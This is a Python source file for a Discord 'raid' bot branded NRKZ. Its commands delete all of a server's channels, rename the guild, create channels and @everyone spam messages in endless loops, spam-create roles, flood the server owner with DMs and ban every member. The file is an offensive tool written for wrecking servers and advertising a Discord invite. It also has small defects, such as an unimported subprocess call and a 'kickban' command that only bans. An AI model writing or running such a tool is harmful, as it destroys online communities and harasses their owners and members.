import discord
from discord.ext import commands
import os
import fade
import time

def Slow(texte):
    delay = 0.03
    lignes = texte.split('\n')
    for ligne in lignes:
        print(ligne)
        time.sleep(delay)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

async def main():
    clear()
    Slow(fade.water("============================================="))
    Slow(fade.water("           Discord Raid Bot                  "))
    Slow(fade.water("============================================="))

def token_bot():
    clear()
    token = input(fade.water("Enter bot Token: "))

    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix='!', intents=intents)

    bot.remove_command("help")

    @bot.event
    async def on_ready():
        clear()
        Slow(fade.water(f"Bot {bot.user} has connected."))
        activity = discord.Streaming(name="NRKZ RAID", url="https://twitch.tv/nkrztebz")
        await bot.change_presence(activity=activity)

    @bot.command()
    async def help(ctx):
        embed = discord.Embed(title="NRKZ RAID Commands", description="List of available commands:", color=0xff0000)
        embed.add_field(name="`!NRKZ`", value="Nukes all server", inline=False)
        embed.add_field(name="`!rolespam`", value="Creates roles ", inline=False)
        embed.add_field(name="`!ownerspam`", value="DMs the server owner with a nuke message.", inline=False)
        embed.add_field(name="`!guildname [newname]`", value="Changes the guild name.", inline=False)
        embed.add_field(name="`!massban`", value="Bans all members from the server.", inline=False)
        embed.add_field(name="`!kickban`", value="Bans and kicks all members from the server.", inline=False)
        embed.set_footer(text="https://discord.gg/HhQwbnzda2")
        embed.set_image(url="https://cdn.discordapp.com/attachments/1241868987017592911/1243962527696814112/Pa2Xd2Z.png?ex=665361e2&is=66521062&hm=6de5d38e774a741588822e44a731ed39dd91384c57927095bf44658cce503032")
        await ctx.send(embed=embed)

    @bot.command()
    async def NRKZ(ctx):
        await ctx.message.delete()
        await ctx.guild.edit(name="NUKED BY NRKZ")
        try:
            for channels in ctx.guild.channels:
                await channels.delete()
                Slow(f'deleted {channels}')
        except:
            Slow(f'cant delete {channels}')

        while True:
            await ctx.guild.create_text_channel("NRKZ-raid")

    @bot.event
    async def on_guild_channel_create(channel):
        while True:
            await channel.send("@here @everyone nuked by NRKZ MULTI TOOLS https://discord.gg/HhQwbnzda2")

    @bot.command()
    async def rolespam(ctx):
        await ctx.message.delete()
        for i in range(100):
            await ctx.guild.create_role(name="NRKZ RAID")

    @bot.command()
    async def ownerspam(ctx):
        owner = ctx.guild.owner
        while True:
            await owner.send("YOUR SERV HAS BEEN NUKED BY NRKZ MULTI TOOLS https://discord.gg/HhQwbnzda2")

    @bot.command()
    async def guildname(ctx, newname):
        await ctx.message.delete()
        await ctx.guild.edit(name=newname)

    @bot.command()
    async def massban(ctx):
        try:
            for members in ctx.guild.members:
                await members.ban(reason="NUKED BY NRKZ HEEHHE")
                Slow(f" ban {members}")
        except:
            Slow(f"cant ban {members}")

    @bot.command()
    async def kickban(ctx):
        try:
            for members in ctx.guild.members:
                await members.ban(reason="NUKED BY NRKZ HEEHHE")
                Slow(f" kicked {members}")
        except:
            Slow(f"cant kick {members}")

    bot.run(token)

if __name__ == "__main__":
    token_bot()
    subprocess.run(["python", "../main.py"])
